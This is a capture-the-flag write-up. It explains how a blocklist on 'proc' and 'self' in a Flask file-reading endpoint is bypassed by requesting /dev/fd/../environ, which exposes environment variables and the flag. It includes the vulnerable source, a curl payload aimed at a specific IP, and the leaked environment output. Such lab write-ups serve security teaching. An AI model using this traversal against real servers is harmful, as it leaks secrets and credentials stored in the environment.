
## Description
`can you read my thoughts`

## source code from zip file

```python
from flask import Flask,request  
import os  
  
flag = os.environ.get('flag')  
  
app = Flask(__name__)  
  
@app.route('/')  
def hello_world():  
	return 'Hello, World!'  
  
blocked=["proc","self"]  
  
@app.route('/readfile')  
def readfile():  
	if request.args.get('file'):  
		file=request.args.get('file').encode('utf-8')  
	if any([b in file.decode("utf-8") for b in blocked]) :  
		return "Blocked, why not try to read note.txt?"  
	try:  
		content=open(os.path.join("safe/",file.decode('utf-8'))).rea()  
		return content  
	except:  
		return "An error occured"  
  
	else:  
		return "please enter ?file"  
  
if __name__ == '__main__':  
app.run(host='0.0.0.0')
```

- **as we can see the flag is in an environment variable , environment variables is stored in /proc/self/environ**

- **as we can see the word `proc` and `self` is blocked** 


##### **first i thought it was about encoding or escaping chars but a hint was released after a while that it is another path in the system** 

##### **I searched for symbolic link to `/proc/self` after a lot of searching online i found that the best place to search is my Linux , i found that /dev have a lot of symbolic links using `ls -lah` one of them absolutely is our answer**

```bash
lrwxrwxrwx   1 root root            13 Jul 29 11:47 fd -> /proc/self/fd
```

##### so our payload will be
``` bash
curl "http://185.69.167.144:5000/readfile?file=/dev/fd/../environ"  

PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=87b219cf3f12LANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E3102  
50568PYTHON_VERSION=3.9.17PYTHON_PIP_VERSION=23.0.1PYTHON_SETUPTOOLS_VERSION=58.1.0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/0d8570dc44796f4369  
b652222cf176b3db6ac70e/public/get-pip.pyPYTHON_GET_PIP_SHA256=96461deced5c2a487ddc65207ec5a9cffeca0d34e7af7ea1afc470ff0d746207flag=CATF{FREE_pALESsTIne_4444  
444_Ev3r_env}HOME=/root%
```

##### and here is our flag 
```
CATF{FREE_pALESsTIne_4444444_Ev3r_env}
```